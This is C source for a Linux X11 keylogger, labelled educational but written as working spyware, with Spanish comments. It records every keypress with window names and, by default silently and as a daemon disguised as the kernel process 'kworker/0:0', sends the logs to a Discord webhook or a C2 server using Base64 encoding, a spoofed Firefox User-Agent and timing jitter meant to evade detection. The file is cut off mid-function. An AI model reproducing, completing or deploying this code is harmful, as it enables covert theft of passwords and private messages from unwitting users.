/*
 * X11 Educational Keylogger
 * 
 * AVISO LEGAL Y ÉTICO:
 * Este programa es solo para propósitos educativos y de investigación.
 * Demuestra las vulnerabilidades inherentes del protocolo X11 en sistemas Linux.
 * El uso no autorizado de este software puede ser ilegal.
 * Use solo en sistemas propios o con permiso explícito.
 * 
 * Este keylogger demuestra cómo cualquier aplicación en X11 puede capturar
 * eventos de teclado de otras aplicaciones sin necesidad de privilegios elevados,
 * una vulnerabilidad fundamental del diseño de X11 desde 1984.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <X11/extensions/record.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <getopt.h>

// Includes para exfiltración de red
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <sys/utsname.h>
#include <curl/curl.h>

// Módulo de persistencia
#include "persistence.h"

#define LOG_FILE "keylog.txt"
#define MAX_WINDOW_NAME 256
#define DAEMON_PROCESS_NAME "kworker/0:0"  // Nombre que simula un proceso del kernel

// Constantes de exfiltración
#define EXFIL_BUFFER_SIZE 8192
#define EXFIL_MAX_RETRIES 3
#define EXFIL_DEFAULT_PORT "8080"
#define EXFIL_DEFAULT_PATH "/upload"
#define EXFIL_JITTER_PERCENT 10  // Porcentaje de jitter para variar envíos (±10%)
// User-Agent que simula Firefox en Linux para evadir detección
#define EXFIL_USER_AGENT "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

/**
 * Estructura para el estado de exfiltración HTTP.
 * Permite enviar datos capturados a un servidor C2 remoto.
 */
typedef struct {
    int enabled;                          // Flag para activar exfiltración
    int mode;                             // 0=HTTP, 1=Discord
    char server[256];                     // IP o hostname del servidor C2 (solo HTTP)
    char port[16];                        // Puerto del servidor (solo HTTP)
    char path[256];                       // Path del endpoint (ej: /upload) (solo HTTP)
    char discord_webhook[512];            // Discord webhook URL (solo Discord)
    pthread_t thread;                     // Thread de exfiltración
    pthread_mutex_t buffer_mutex;         // Mutex para sincronización del buffer
    char buffer[EXFIL_BUFFER_SIZE];       // Buffer de datos a exfiltrar
    size_t buffer_len;                    // Longitud actual del buffer
    volatile int thread_running;          // Flag para control del thread
    int first_send;                       // Flag para enviar mensaje inicial
    int exfil_interval;                   // Intervalo de exfiltración en segundos (configurable)
} ExfilState;

// Estructura para encapsular el estado del keylogger
typedef struct {
    Display *display;
    Display *record_display;
    FILE *logfile;
    XRecordContext record_context;
    volatile sig_atomic_t running;
    int daemon_mode;
    int quiet_mode;
    char log_filename[256];
    char last_window[MAX_WINDOW_NAME];
    char display_env[64];  // Guardar DISPLAY para uso después de daemonizar
    ExfilState exfil;      // Estado de exfiltración
} KeyloggerState;

// Estado global del keylogger
static char g_binary_path[256] = {0};  // Ruta absoluta del binario para persistencia

static KeyloggerState g_state = {
    .display = NULL,
    .record_display = NULL,
    .logfile = NULL,
    .record_context = 0,
    .running = 1,
    .daemon_mode = 1,         // Modo daemon habilitado por defecto (oculto)
    .quiet_mode = 1,          // MODO SILENCIOSO habilitado por defecto (sin output)
    .log_filename = LOG_FILE,
    .last_window = {0},
    .display_env = {0},
    .exfil = {
        .enabled = 1,          // Discord habilitado por defecto
        .mode = 1,             // Modo Discord por defecto
        .server = {0},
        .port = EXFIL_DEFAULT_PORT,
        .path = EXFIL_DEFAULT_PATH,
        .discord_webhook = {0},
        .thread = 0,
        .buffer = {0},
        .buffer_len = 0,
        .thread_running = 0,
        .first_send = 1,       // Bandera para primer envío
        .exfil_interval = 60   // 60 segundos por defecto para testing
    }
};

// Manejador de señales para limpieza
void signal_handler(int signum) {
    (void)signum; // Parámetro requerido pero no usado
    g_state.running = 0;
    if (!g_state.quiet_mode && !g_state.daemon_mode) {
        printf("\n[!] Deteniendo keylogger...\n");
    }
}

// Obtener el nombre de la ventana activa
char* get_window_name(Display *display, Window window) {
    static char window_name[MAX_WINDOW_NAME];
    char *name = NULL;
    
    if (window == None) {
        strncpy(window_name, "Unknown", MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
        return window_name;
    }
    
    if (XFetchName(display, window, &name) && name) {
        strncpy(window_name, name, MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
        XFree(name);
    } else {
        strncpy(window_name, "Unnamed Window", MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
    }
    
    return window_name;
}

// Obtener la ventana con foco actual
Window get_focused_window(Display *display) {
    Window focused;
    int revert;
    
    XGetInputFocus(display, &focused, &revert);
    
    // Si es la ventana raíz o PointerRoot, intentar obtener la ventana real
    if (focused == None || focused == PointerRoot) {
        Window root = DefaultRootWindow(display);
        Window parent, *children;
        unsigned int nchildren;
        
        if (XQueryTree(display, root, &root, &parent, &children, &nchildren)) {
            if (nchildren > 0) {
                focused = children[nchildren - 1];
            }
            if (children) XFree(children);
        }
    }
    
    return focused;
}

// Convertir KeySym a string legible
const char* keysym_to_string(KeySym keysym) {
    static char buffer[32];
    
    // Teclas especiales
    switch(keysym) {
        case XK_Return: return "[ENTER]";
        case XK_BackSpace: return "[BACKSPACE]";
        case XK_Tab: return "[TAB]";
        case XK_Escape: return "[ESC]";
        case XK_Delete: return "[DELETE]";
        case XK_Home: return "[HOME]";
        case XK_End: return "[END]";
        case XK_Page_Up: return "[PGUP]";
        case XK_Page_Down: return "[PGDN]";
        case XK_Left: return "[LEFT]";
        case XK_Right: return "[RIGHT]";
        case XK_Up: return "[UP]";
        case XK_Down: return "[DOWN]";
        case XK_space: return " ";
        case XK_Shift_L:
        case XK_Shift_R: return "[SHIFT]";
        case XK_Control_L:
        case XK_Control_R: return "[CTRL]";
        case XK_Alt_L:
        case XK_Alt_R: return "[ALT]";
        case XK_Caps_Lock: return "[CAPS]";
        case XK_F1: return "[F1]";
        case XK_F2: return "[F2]";
        case XK_F3: return "[F3]";
        case XK_F4: return "[F4]";
        case XK_F5: return "[F5]";
        case XK_F6: return "[F6]";
        case XK_F7: return "[F7]";
        case XK_F8: return "[F8]";
        case XK_F9: return "[F9]";
        case XK_F10: return "[F10]";
        case XK_F11: return "[F11]";
        case XK_F12: return "[F12]";
        default: {
            char *str = XKeysymToString(keysym);
            if (str && strlen(str) == 1) {
                buffer[0] = str[0];
                buffer[1] = '\0';
                return buffer;
            } else if (str) {
                snprintf(buffer, sizeof(buffer), "[%s]", str);
                return buffer;
            }
            return "[UNKNOWN]";
        }
    }
}

// Obtener timestamp
void get_timestamp(char *buffer, size_t size) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", t);
}

// ============================================================================
// FUNCIONES DE EXFILTRACIÓN
// ============================================================================

// Tabla de caracteres Base64
static const char base64_table[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Codifica datos en Base64 para evadir detección por firmas de texto plano.
 * 
 * @param input Datos a codificar
 * @param input_len Longitud de los datos de entrada
 * @param output Buffer de salida (debe tener al menos (input_len * 4/3) + 4 bytes)
 * @param output_size Tamaño del buffer de salida
 * @return Longitud de la cadena codificada, o -1 en error
 */
int exfil_base64_encode(const unsigned char *input, size_t input_len, 
                        char *output, size_t output_size) {
    size_t i, j;
    size_t output_len = 4 * ((input_len + 2) / 3);
    
    if (output_size < output_len + 1) {
        return -1;  // Buffer muy pequeño
    }
    
    for (i = 0, j = 0; i < input_len;) {
        uint32_t octet_a = i < input_len ? input[i++] : 0;
        uint32_t octet_b = i < input_len ? input[i++] : 0;
        uint32_t octet_c = i < input_len ? input[i++] : 0;
        
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        
        output[j++] = base64_table[(triple >> 18) & 0x3F];
        output[j++] = base64_table[(triple >> 12) & 0x3F];
        output[j++] = base64_table[(triple >> 6) & 0x3F];
        output[j++] = base64_table[triple & 0x3F];
    }
    
    // Padding con '='
    size_t mod = input_len % 3;
    if (mod > 0) {
        output[output_len - 1] = '=';
        if (mod == 1) {
            output[output_len - 2] = '=';
        }
    }
    
    output[output_len] = '\0';
    return (int)output_len;
}

/**
 * Callback silencioso para libcurl - descarta toda la respuesta.
 * Minimiza rastro al no escribir nada a stdout/stderr.
 */
static size_t curl_write_null(void *ptr, size_t size, size_t nmemb, void *userdata) {
    (void)ptr;
    (void)userdata;
    return size * nmemb;  // Simular que procesamos los datos
}

/**
 * Escapa caracteres especiales en JSON de forma segura.
 * Evita inyección de datos maliciosos en el payload JSON.
 * 
 * @param input Cadena de entrada
 * @param output Buffer de salida (debe ser al menos 2x input)
 * @param output_size Tamaño del buffer de salida
 * @return Longitud de la cadena escapada
 */
static size_t json_escape_string(const char *input, size_t input_len,
                                  char *output, size_t output_size) {
    size_t j = 0;
    for (size_t i = 0; i < input_len && j < output_size - 6; i++) {
        unsigned char c = (unsigned char)input[i];
        switch (c) {
            case '"':  output[j++] = '\\'; output[j++] = '"'; break;
            case '\\': output[j++] = '\\'; output[j++] = '\\'; break;
            case '\n': output[j++] = '\\'; output[j++] = 'n'; break;
            case '\r': output[j++] = '\\'; output[j++] = 'r'; break;
            case '\t': output[j++] = '\\'; output[j++] = 't'; break;
            case '\b': output[j++] = '\\'; output[j++] = 'b'; break;
            case '\f': output[j++] = '\\'; output[j++] = 'f'; break;
            default:
                if (c < 0x20) {
                    // Caracteres de control: escapar como \uXXXX
                    j += snprintf(output + j, output_size - j, "\\u%04x", c);
                } else {
                    output[j++] = c;
                }
                break;
        }
    }
    output[j] = '\0';
    return j;
}

/**
 * Envía datos a Discord mediante webhook usando libcurl.
 * Implementación segura sin riesgo de inyección de comandos.
 * Minimiza rastro: no crea procesos hijos, no usa shell.
 * 
 * @param webhook_url URL completa del webhook Discord
 * @param data Datos a enviar (sin codificar)
 * @param data_len Longitud de los datos
 * @return 0 en éxito, -1 si error
 */
int discord_webhook_post(const char *webhook_url, const char *data, size_t data_len) {
    if (!webhook_url || webhook_url[0] == '\0' || !data || data_len == 0) {
        return -1;
    }
    
    CURL *curl;
    CURLcode res;
    int ret = -1;
    
    // Buffer para JSON escapado (2x para escapado + overhead)
    size_t escaped_size = data_len * 2 + 64;
    char *escaped_data = malloc(escaped_size);
    char *json_payload = NULL;
    
    if (!escaped_data) {
        return -1;
    }
    
    // Escapar datos para JSON de forma segura
    size_t escaped_len = json_escape_string(data, data_len, escaped_data, escaped_size);
    
    // Construir payload JSON
    size_t json_size = escaped_len + 32;  // {"content":"..."}
    json_payload = malloc(json_size);
    if (!json_payload) {
        free(escaped_data);
        return -1;
    }
    snprintf(json_payload, json_size, "{\"content\":\"%s\"}", escaped_data);
    free(escaped_data);
    
    // Inicializar libcurl
    curl = curl_easy_init();
    if (!curl) {
        free(json_payload);
        return -1;
    }
    
    // Configurar headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    
    // Configurar opciones de curl para minimizar rastro
    curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    
    // Callback silencioso - no escribe respuesta a ningún lado
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_null);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL);
    
    // Desactivar señales para evitar interferencia con threads
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    
    // Timeout razonable para no bloquear
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    
    // Seguir redirecciones si Discord las usa
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 3L);
    
    // SSL/TLS configuración
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    
    // User-Agent discreto
    curl_easy_setopt(curl, CURLOPT_USERAGENT, EXFIL_USER_AGENT);
    
    // Ejecutar request
    res = curl_easy_perform(curl);
    
    if (res == CURLE_OK) {
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        // Discord devuelve 204 No Content en éxito
        if (http_code >= 200 && http_code < 300) {
            ret = 0;
        }
    }
    
    // Limpiar recursos
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(json_payload);
    
    return ret;
}

/**
 * Envía datos al servidor C2 mediante HTTP POST.
 * Implementa técnicas de evasión: User-Agent spoofing y codificación Base64.
 * 
 * @param server Hostname o IP del servidor
 * @param port Puerto del servidor
 * @param path Path del endpoint (ej: /upload)
 * @param data Datos a enviar (ya codificados en base64)
 * @param data_len Longitud de los datos
 * @return 0 en éxito, -1 en error
 */
int exfil_http_post(const char *server, const char *port, 
                    const char *path, const char *data, size_t data_len) {
    struct addrinfo hints, *result, *rp;
    int sockfd = -1;
    int ret;
    char request[EXFIL_BUFFER_SIZE + 512];
    char response[256];
    
    // Configurar hints para getaddrinfo
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;      // IPv4 o IPv6
    hints.ai_socktype = SOCK_STREAM;  // TCP
    
    // Resolver hostname
    ret = getaddrinfo(server, port, &hints, &result);
    if (ret != 0) {
        return -1;  // Error de resolución DNS
    }
    
    // Intentar conectar a cada dirección
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sockfd == -1) {
            continue;
        }
        
        // Configurar timeout de conexión
        struct timeval tv;
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        if (connect(sockfd, rp->ai_addr, rp->ai_addrlen) != -1) {
            break;  // Conexión exitosa
        }
        
        close(sockfd);
        sockfd = -1;
    }
    
    freeaddrinfo(result);
    
    if (sockfd == -1) {
        return -1;  // No se pudo conectar
    }
    
    // Construir request HTTP POST con User-Agent spoofing
    int request_len = snprintf(request, sizeof(request),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%s\r\n"
        "User-Agent: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "data=%.*s",
        path, server, port, EXFIL_USER_AGENT, 
        data_len + 5,  // +5 por "data="
        (int)data_len, data);
    
    // Enviar request
    ssize_t sent = send(sockfd, request, request_len, 0);
    if (sent < 0) {
        close(sockfd);
        return -1;
    }
    
    // Leer respuesta (para verificar éxito, opcional)
    ssize_t received = recv(sockfd, response, sizeof(response) - 1, 0);
    if (received > 0) {
        response[received] = '\0';
        // Verificar código de respuesta HTTP (200 OK, etc.)
        // No es crítico si falla, los datos ya fueron enviados
    }
    
    close(sockfd);
    return 0;
}

/**
 * Agrega datos al buffer de exfiltración de forma thread-safe.
 * Si el buffer está lleno, los datos más antiguos se descartan.
 * 
 * @param data Datos a agregar
 * @param len Longitud de los datos
 */
void exfil_add_to_buffer(const char *data, size_t len) {
    if (!g_state.exfil.enabled || len == 0) {
        return;
    }
    
    pthread_mutex_lock(&g_state.exfil.buffer_mutex);
    
    // Verificar si hay espacio en el buffer
    size_t space_left = EXFIL_BUFFER_SIZE - g_state.exfil.buffer_len - 1;
    
    if (len > space_left) {
        // Buffer lleno, truncar los datos
        len = space_left;
    }
    
    if (len > 0) {
        memcpy(g_state.exfil.buffer + g_state.exfil.buffer_len, data, len);
        g_state.exfil.buffer_len += len;
        g_state.exfil.buffer[g_state.exfil.buffer_len] = '\0';
    }
    
    pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
}

/**
 * Obtiene información del sistema para el mensaje inicial.
 * Incluye hostname, usuario, timestamp y configuración.
 * Thread-safe: el llamador proporciona el búfer.
 * 
 * @param info_buffer Búfer donde escribir la información
 * @param buffer_size Tamaño del búfer
 */
void exfil_get_system_info(char *info_buffer, size_t buffer_size) {
    char hostname[256];
    char username[256];
    char timestamp[64];
    
    if (!info_buffer || buffer_size == 0) {
        return;
    }
    
    // Obtener hostname
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        strncpy(hostname, "unknown", sizeof(hostname) - 1);
    }
    hostname[sizeof(hostname) - 1] = '\0';
    
    // Obtener usuario
    const char *user = getenv("USER");
    if (user) {
        strncpy(username, user, sizeof(username) - 1);
    } else {
        strncpy(username, "unknown", sizeof(username) - 1);
    }
    username[sizeof(username) - 1] = '\0';
    
    // Obtener timestamp
    get_timestamp(timestamp, sizeof(timestamp));
    
    // Construir mensaje informativo
    snprintf(info_buffer, buffer_size,
        "=== INICIO DE CAPTURA X11 ===\n"
        "Hora: %s\n"
        "Host: %s\n"
        "Usuario: %s\n"
        "Display: %s\n"
        "Intervalo: %d segundos\n"
        "Modo: Discord Webhook\n"
        "=== DATOS CAPTURADOS ===\n",
        timestamp, hostname, username, g_state.display_env, g_state.exfil.exfil_interval);
}

/**
 * Envía el mensaje inicial al webhook de Discord.
 * Se llama una sola vez al iniciar el thread de exfiltración.
 */
void exfil_send_initial_message(void) {
    if (g_state.exfil.mode != 1 || g_state.exfil.first_send == 0) {
        return;  // No es Discord o ya se envió el mensaje inicial
    }
    
    // Búfer en la pila para thread-safety
    char system_info[1024];
    exfil_get_system_info(system_info, sizeof(system_info));
    discord_webhook_post(g_state.exfil.discord_webhook, system_info, strlen(system_info));
    
    g_state.exfil.first_send = 0;  // Marcar como enviado
}

/**
 * Obtiene un intervalo aleatorio con jitter para evadir detección por patrones.
 * Retorna un valor entre el intervalo configurado ±10%.
 * 
 * @return Segundos a esperar antes del próximo envío
 */
int exfil_get_jitter_interval(void) {
    // Inicializar semilla solo una vez
    static int seeded = 0;
    if (!seeded) {
        srand((unsigned int)time(NULL) ^ (unsigned int)getpid());
        seeded = 1;
    }
    
    // Aplicar jitter del ±10% al intervalo configurado
    int jitter = (g_state.exfil.exfil_interval * EXFIL_JITTER_PERCENT) / 100;
    int min_interval = g_state.exfil.exfil_interval - jitter;
    int max_interval = g_state.exfil.exfil_interval + jitter;
    
    return min_interval + (rand() % (max_interval - min_interval + 1));
}

/**
 * Thread principal de exfiltración.
 * Ejecuta en background, enviando datos periódicamente con jitter.
 * Soporta dos modos:
 * 1. HTTP: Codifica en Base64, implementa reintentos
 * 2. Discord: Envía JSON directamente, fallback a archivo local si falla
 * 
 * @param arg No utilizado
 * @return NULL
 */
void* exfil_thread_func(void *arg) {
    (void)arg;
    
    // Enviar mensaje inicial si es Discord
    exfil_send_initial_message();
    
    char send_buffer[EXFIL_BUFFER_SIZE];
    char base64_buffer[EXFIL_BUFFER_SIZE * 2];  // Base64 expande ~33%
    size_t send_len;
    int retries;
    int backoff;
    
    while (g_state.running && g_state.exfil.thread_running) {
        // Esperar con jitter
        int wait_time = exfil_get_jitter_interval();
        
        // Dormir en intervalos pequeños para poder detectar señal de terminación
        for (int i = 0; i < wait_time && g_state.running && g_state.exfil.thread_running; i++) {
            sleep(1);
        }
        
        if (!g_state.running || !g_state.exfil.thread_running) {
            break;
        }
        
        // Obtener datos del buffer
        pthread_mutex_lock(&g_state.exfil.buffer_mutex);
        
        if (g_state.exfil.buffer_len == 0) {
            pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
            continue;  // Nada que enviar
        }
        
        // Copiar y vaciar buffer
        send_len = g_state.exfil.buffer_len;
        memcpy(send_buffer, g_state.exfil.buffer, send_len);
        send_buffer[send_len] = '\0';
        g_state.exfil.buffer_len = 0;
        g_state.exfil.buffer[0] = '\0';
        
        pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
        
        // ====== MODO DISCORD ======
        if (g_state.exfil.mode == 1) {
            // Intentar enviar a Discord webhook
            int result = discord_webhook_post(
                g_state.exfil.discord_webhook,
                send_buffer,
                send_len
            );
            
            // Si falla, fallback a archivo local
            if (result < 0) {
                // Fallback: escribir a keylog.txt
                FILE *fallback_log = fopen(g_state.log_filename, "a");
                if (fallback_log) {
                    fprintf(fallback_log, "[DISCORD_FALLBACK] %s", send_buffer);
                    fclose(fallback_log);
                }
            }
        }
        // ====== MODO HTTP ======
        else {
            // Codificar en Base64 para evadir detección por firmas
            int base64_len = exfil_base64_encode(
                (unsigned char *)send_buffer, send_len,
                base64_buffer, sizeof(base64_buffer)
            );
            
            if (base64_len < 0) {
                continue;  // Error de codificación, descartar
            }
            
            // Intentar enviar con reintentos y backoff exponencial
            retries = 0;
            backoff = 1;
            
            while (retries < EXFIL_MAX_RETRIES) {
                int result = exfil_http_post(
                    g_state.exfil.server,
                    g_state.exfil.port,
                    g_state.exfil.path,
                    base64_buffer,
                    (size_t)base64_len
                );
                
                if (result == 0) {
                    // Éxito
                    break;
                }
                
                // Fallo: esperar con backoff exponencial antes de reintentar
                retries++;
                if (retries < EXFIL_MAX_RETRIES) {
                    sleep(backoff);
                    backoff *= 2;  // Duplicar tiempo de espera
                }
            }
        }
    }
    
    return NULL;
}

/**
 * Inicializa el subsistema de exfiltración.
 * Crea el mutex y lanza el thread de exfiltración.
 * 
 * @return 0 en éxito, -1 en error
 */
int init_exfiltration(void) {
    if (!g_state.exfil.enabled) {
        return 0;  // Exfiltración deshabilitada, nada que hacer
    }
    
    // Validar configuración según modo
    if (g_state.exfil.mode == 1) {
        // Modo Discord: validar webhook
        if (g_state.exfil.discord_webhook[0] == '\0') {
            return -1;  // Webhook no configurado
        }
    } else {
        // Modo HTTP: validar servidor
        if (g_state.exfil.server[0] == '\0') {
            return -1;  // Servidor no configurado
        }
    }
    
    // Inicializar mutex
    if (pthread_mutex_init(&g_state.exfil.buffer_mutex, NULL) != 0) {
        return -1;
    }
    
    // Marcar thread como activo
    g_state.exfil.thread_running = 1;
    
    // Crear thread de exfiltración
    if (pthread_create(&g_state.exfil.thread, NULL, exfil_thread_func, NULL) != 0) {
        pthread_mutex_destroy(&g_state.exfil.buffer_mutex);
        g_state.exfil.thread_running = 0;
        return -1;
    }
    
    return 0;
}

/**
 * Limpia los recursos del subsistema de exfiltración.
 * Envía los datos pendientes antes de terminar.
 */
void cleanup_exfiltration(void) {
    if (!g_state.exfil.enabled) {
        return;
    }
    
    // Señalar al thread que debe terminar
    g_state.exfil.thread_running = 0;
    
    // Esperar a que el thread termine
    if (g_state.exfil.thread != 0) {
        pthread_join(g_state.exfil.thread, NULL);
        g_state.exfil.thread = 0;
    }
    
    // Intentar enviar datos pendientes una última vez
    if (g_state.exfil.buffer_len > 0) {
        char base64_buffer[EXFIL_BUFFER_SIZE * 2];
        int base64_len = exfil_base64_encode(
            (unsigned char *)g_state.exfil.buffer, 
            g_state.exfil.buffer_len,
            base64_buffer, sizeof(base64_buffer)
        );
        
        if (base64_len > 0) {
            exfil_http_post(
                g_state.exfil.server,
                g_state.exfil.port,
                g_state.exfil.path,
                base64_buffer,
                (size_t)base64_len
            );
        }
    }
    
    // Destruir mutex
    pthread_mutex_destroy(&g_state.exfil.buffer_mutex);
}

// ============================================================================
// FIN FUNCIONES DE EXFILTRACIÓN
// ============================================================================

// Registrar evento de tecla
void log_key_event(const char *window_name, const char *key_str) {
    char timestamp[64];
    char log_line[512];
    
    get_timestamp(timestamp, sizeof(timestamp));
    
    // Formatear línea de log
    int log_len = snprintf(log_line, sizeof(log_line), 
                          "[%s] [%s] %s\n", timestamp, window_name, key_str);
    
    // Escribir en archivo
    if (g_state.logfile) {
        fprintf(g_state.logfile, "%s", log_line);
        fflush(g_state.logfile);
    }
    
    // Agregar al buffer de exfiltración si está habilitado
    if (g_state.exfil.enabled && log_len > 0) {
        exfil_add_to_buffer(log_line, (size_t)log_len);
    }
    
    // Mostrar en consola solo si no está en modo silencioso/daemon
    if (!g_state.quiet_mode && !g_state.daemon_mode) {
        printf("%s", log_line);
    }
}

// Callback para XRecord - aquí se procesan los eventos capturados
void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
    (void)closure; // No usado
    
    // Sleep mode DESHABILITADO - causaba problemas
    // if (get_current_state() != STATE_NORMAL) {
    //     XRecordFreeData(recorded_data);
    //     return;
    // }
    
    if (recorded_data->category == XRecordFromServer) {
        // Obtener el tipo de evento
        int event_type = recorded_data->data[0];
        
        // Solo procesar eventos KeyPress (tipo 2)
        if (event_type == KeyPress) {
            // Extraer el keycode del evento
            unsigned char keycode = recorded_data->data[1];
            
            // Obtener ventana con foco
            Window focused = get_focused_window(g_state.display);
            char *window_name = get_window_name(g_state.display, focused);
            
            // Convertir keycode a keysym usando XkbKeycodeToKeysym (reemplaza función deprecada)
            KeySym keysym = XkbKeycodeToKeysym(g_state.display, keycode, 0, 0);
            const char *key_str = keysym_to_string(keysym);
            
            // Detectar cambio de ventana (usando buffer estático en g_state)
            if (g_state.last_window[0] == '\0' || strcmp(g_state.last_window, window_name) != 0) {
                char window_change_msg[512];
                snprintf(window_change_msg, sizeof(window_change_msg), 
                        "\n--- Ventana activa: %s ---\n", window_name);
                if (g_state.logfile) {
                    fprintf(g_state.logfile, "%s", window_change_msg);
                    fflush(g_state.logfile);
                }
                if (!g_state.quiet_mode && !g_state.daemon_mode) {
                    printf("%s", window_change_msg);
                }
                // Copiar el nombre de ventana de forma segura
                strncpy(g_state.last_window, window_name, MAX_WINDOW_NAME - 1);
                g_state.last_window[MAX_WINDOW_NAME - 1] = '\0';
            }
            
            log_key_event(window_name, key_str);
        }
    }
    
    // IMPORTANTE: Liberar los datos grabados
    XRecordFreeData(recorded_data);
}

/**
 * Convierte un path relativo a absoluto.
 * Si ya es absoluto, lo copia sin cambios.
 */
void make_absolute_path(char *dest, const char *src, size_t dest_size) {
    if (src[0] == '/') {
        // Ya es absoluto
        strncpy(dest, src, dest_size - 1);
        dest[dest_size - 1] = '\0';
    } else {
        // Convertir a absoluto
        char cwd[256];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            snprintf(dest, dest_size, "%s/%s", cwd, src);
        } else {
            // Fallback: usar /tmp si no podemos obtener cwd
            snprintf(dest, dest_size, "/tmp/%s", src);
        }
    }
}

/**
 * Daemoniza el proceso para ejecutarse en segundo plano.
 * - Hace fork() para desacoplar del terminal padre
 * - Crea nueva sesión con setsid()
 * - Cambia el nombre del proceso para ocultarlo
 * - Cierra stdin/stdout/stderr
 * 
 * @return 0 si es el proceso hijo (daemon), -1 en error, >0 si es el padre
 */
int daemonize(void) {
    pid_t pid;
    
    // Convertir log_filename a path absoluto ANTES de cambiar directorio
    char abs_log[256];
    make_absolute_path(abs_log, g_state.log_filename, sizeof(abs_log));
    strncpy(g_state.log_filename, abs_log, sizeof(g_state.log_filename) - 1);
    g_state.log_filename[sizeof(g_state.log_filename) - 1] = '\0';
    
    // Primer fork: el padre termina, el hijo continúa
    pid = fork();
    if (pid < 0) {
        return -1;  // Error en fork
    }
    if (pid > 0) {
        // Proceso padre: mostrar info y terminar
        printf("[*] Daemon iniciándose en segundo plano...\n");
        printf("[*] Log: %s\n", g_state.log_filename);
        printf("[*] Para encontrar el PID: ps -eo pid,ppid,comm | grep kworker\n");
        printf("[*] Para detener: pkill -f \"kworker/0:0\" (buscar PPID != 2)\n");
        exit(0);
    }
    
    // Crear nueva sesión (desacoplar del terminal)
    if (setsid() < 0) {
        return -1;
    }
    
    // Segundo fork: previene que el daemon adquiera un terminal de control
    pid = fork();
    if (pid < 0) {
        return -1;
    }
    if (pid > 0) {
        exit(0);  // El primer hijo termina
    }
    
    // Ahora somos el daemon real (nieto del proceso original)
    
    // Cambiar el nombre del proceso para ocultarlo
    // Esto hace que aparezca como un proceso del sistema en `ps` y `top`
    if (prctl(PR_SET_NAME, DAEMON_PROCESS_NAME, 0, 0, 0) < 0) {
        // No es crítico si falla, continuamos
    }
    
    // NO cambiar directorio a raíz para evitar problemas con paths
    // El log ya tiene path absoluto
    
    // Establecer máscara de permisos
    umask(0);
    
    // Cerrar descriptores de archivo estándar
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Redirigir stdin/stdout/stderr a /dev/null
    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) {
            close(fd);
        }
    }
    
    return 0;  // Éxito, somos el daemon
}

/**
 * Limpia todos los recursos del keylogger.
 * Centraliza la lógica de limpieza para evitar duplicación.
 */
void cleanup_resources(void) {
    char timestamp[64];
    
    // Deshabilitar y liberar contexto de grabación
    if (g_state.record_context && g_state.record_display) {
        XRecordDisableContext(g_state.record_display, g_state.record_context);
        XRecordFreeContext(g_state.record_display, g_state.record_context);
        g_state.record_context = 0;
    }
    
    // Limpiar exfiltración (envía datos pendientes antes de cerrar)
    cleanup_exfiltration();
    
    // Cerrar archivo de log
    if (g_state.logfile) {
        fprintf(g_state.logfile, "\n=== Sesión finalizada ===\n");
        get_timestamp(timestamp, sizeof(timestamp));
        fprintf(g_state.logfile, "Fin: %s\n\n", timestamp);
        fclose(g_state.logfile);
        g_state.logfile = NULL;
    }
    
    // Cerrar conexiones X11
    if (g_state.display) {
        XCloseDisplay(g_state.display);
        g_state.display = NULL;
    }
    
    if (g_state.record_display) {
